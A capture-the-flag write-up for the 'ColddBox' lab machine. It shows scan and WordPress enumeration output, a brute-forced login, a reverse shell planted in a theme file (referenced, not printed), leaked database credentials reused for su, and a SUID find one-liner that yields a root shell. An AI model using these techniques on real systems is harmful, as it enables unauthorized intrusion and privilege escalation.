# Box Name
## Colddbox
---

## Overview

### An easy level machine with multiple ways to escalate privileges.
---
* [[#Enumeration]]

* [[#Initial Foothold]]

* [[#Privilege Escalation]]

---
## Enumeration
---

- # nmap
```
Nmap 7.91 scan initiated Thu Jan  7 13:59:34 2021 as: nmap -sC -sV -vv -Pn -oN nmap/init 10.10.174.149
Nmap scan report for 10.10.174.149
Host is up, received user-set (0.20s latency).
Scanned at 2021-01-07 13:59:34 CST for 36s
Not shown: 999 closed ports
Reason: 999 conn-refused
PORT   STATE SERVICE REASON  VERSION
80/tcp open  http    syn-ack Apache httpd 2.4.18 ((Ubuntu))
|_http-generator: WordPress 4.1.31
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: ColddBox | One more machine

```

- # gobuster
```
/wp-content (Status: 301)
/wp-includes (Status: 301)
/wp-admin (Status: 301)
/hidden (Status: 301)

```

- # wpscan
```

_______________________________________________________________
         __          _______   _____
         \ \        / /  __ \ / ____|
          \ \  /\  / /| |__) | (___   ___  __ _ _ __ ®
           \ \/  \/ / |  ___/ \___ \ / __|/ _` | '_ \
            \  /\  /  | |     ____) | (__| (_| | | | |
             \/  \/   |_|    |_____/ \___|\__,_|_| |_|

         WordPress Security Scanner by the WPScan Team
                         Version 3.8.11
       Sponsored by Automattic - https://automattic.com/
       @_WPScan_, @ethicalhack3r, @erwan_lr, @firefart
_______________________________________________________________

[+] URL: http://10.10.174.149/ [10.10.174.149]
[+] Started: Thu Jan  7 14:04:26 2021

Interesting Finding(s):

[+] Headers
 | Interesting Entry: Server: Apache/2.4.18 (Ubuntu)
 | Found By: Headers (Passive Detection)
 | Confidence: 100%

[+] XML-RPC seems to be enabled: http://10.10.174.149/xmlrpc.php
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%
 | References:
 |  - http://codex.wordpress.org/XML-RPC_Pingback_API
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_ghost_scanner
 |  - https://www.rapid7.com/db/modules/auxiliary/dos/http/wordpress_xmlrpc_dos
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_xmlrpc_login
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_pingback_access

[+] WordPress readme found: http://10.10.174.149/readme.html
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%

[+] The external WP-Cron seems to be enabled: http://10.10.174.149/wp-cron.php
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 60%
 | References:
 |  - https://www.iplocation.net/defend-wordpress-from-ddos
 |  - https://github.com/wpscanteam/wpscan/issues/1299

[+] WordPress version 4.1.31 identified (Insecure, released on 2020-06-10).
 | Found By: Rss Generator (Passive Detection)
 |  - http://10.10.174.149/?feed=rss2, <generator>https://wordpress.org/?v=4.1.31</generator>
 |  - http://10.10.174.149/?feed=comments-rss2, <generator>https://wordpress.org/?v=4.1.31</generator>

[+] WordPress theme in use: twentyfifteen
 | Location: http://10.10.174.149/wp-content/themes/twentyfifteen/
 | Last Updated: 2020-12-09T00:00:00.000Z
 | Readme: http://10.10.174.149/wp-content/themes/twentyfifteen/readme.txt
 | [!] The version is out of date, the latest version is 2.8
 | Style URL: http://10.10.174.149/wp-content/themes/twentyfifteen/style.css?ver=4.1.31
 | Style Name: Twenty Fifteen
 | Style URI: https://wordpress.org/themes/twentyfifteen
 | Description: Our 2015 default theme is clean, blog-focused, and designed for clarity. Twenty Fifteen's simple, st...
 | Author: the WordPress team
 | Author URI: https://wordpress.org/
 |
 | Found By: Css Style In Homepage (Passive Detection)
 |
 | Version: 1.0 (80% confidence)
 | Found By: Style (Passive Detection)
 |  - http://10.10.174.149/wp-content/themes/twentyfifteen/style.css?ver=4.1.31, Match: 'Version: 1.0'


[i] No plugins Found.


[i] No themes Found.


[i] No Timthumbs Found.


[i] No Config Backups Found.


[i] No DB Exports Found.


[i] No Medias Found.


[i] User(s) Identified:

[+] the cold in person
 | Found By: Rss Generator (Passive Detection)

[+] c0ldd
 | Found By: Author Id Brute Forcing - Author Pattern (Aggressive Detection)
 | Confirmed By: Login Error Messages (Aggressive Detection)

[+] hugo
 | Found By: Author Id Brute Forcing - Author Pattern (Aggressive Detection)
 | Confirmed By: Login Error Messages (Aggressive Detection)

[+] philip
 | Found By: Author Id Brute Forcing - Author Pattern (Aggressive Detection)
 | Confirmed By: Login Error Messages (Aggressive Detection)

[!] No WPScan API Token given, as a result vulnerability data has not been output.
[!] You can get a free API token with 50 daily requests by registering at https://wpscan.com/register

[+] Finished: Thu Jan  7 14:06:55 2021
[+] Requests Done: 3120
[+] Cached Requests: 10
[+] Data Sent: 864.387 KB
[+] Data Received: 696.646 KB
[+] Memory used: 255.629 MB
[+] Elapsed time: 00:02:29


```

- used wpscan to find login creeds for word press site
	- c0ldd:9876543210

---
## Initial Foothold

- ### modified 404.php in word press
	- used pentestmonkeys php-reverseshell [[revshell]]

- ## linpeas output
```

Possible Exploits
  [1] af_packet
      CVE-2016-8655
      Source: http://www.exploit-db.com/exploits/40871
  [2] exploit_x
      CVE-2018-14665
      Source: http://www.exploit-db.com/exploits/45697
  [3] get_rekt
      CVE-2017-16695
      Source: http://www.exploit-db.com/exploits/45010

╔══════════╣ Analyzing Wordpress Files (limit 70)
-rw-rw-rw- 1 www-data www-data 3056 Oct 14  2020 /var/www/html/wp-config.php
define('DB_NAME', 'colddbox');
define('DB_USER', 'c0ldd');
define('DB_PASSWORD', 'cybersecurity');
define('DB_HOST', 'localhost');

════════════════════════════════════╣ Interesting Files ╠════════════════════════════════════
╔══════════╣ SUID - Check easy privesc, exploits and write perms
╚ https://book.hacktricks.xyz/linux-unix/privilege-escalation#sudo-and-suid

-rwsr-xr-x 1 root root 217K Feb  8  2016 /usr/bin/find

```
---
## Privilege Escalation
- ## Password reuse
	- ### su to c0ldd user with sql creds
		- #### c0ldd:cybersecurity
		- cat user.txt
		```bash
		www-data@ColddBox-Easy:/tmp$ su c0ldd
		Password: 
		c0ldd@ColddBox-Easy:/tmp$ cd /home/c0ldd
		c0ldd@ColddBox-Easy:~$ cat user.txt
		RmVsaWNpZGFkZXMsIHByaW1lciBuaXZlbCBjb25zZWd1aWRvIQ==
		
		```

- ## find command set to suid
	- ### GTFObins [[gtfobins]]
		- find . -exec /bin/bash -p \; -quit
		- root shell
		```bash
		c0ldd@ColddBox-Easy:~$  find . -exec /bin/bash -p \; -quit
		bash-4.3# cd /root
		bash-4.3# cat root.txt
		wqFGZWxpY2lkYWRlcywgbcOhcXVpbmEgY29tcGxldGFkYSE=
		bash-4.3#
		```

----
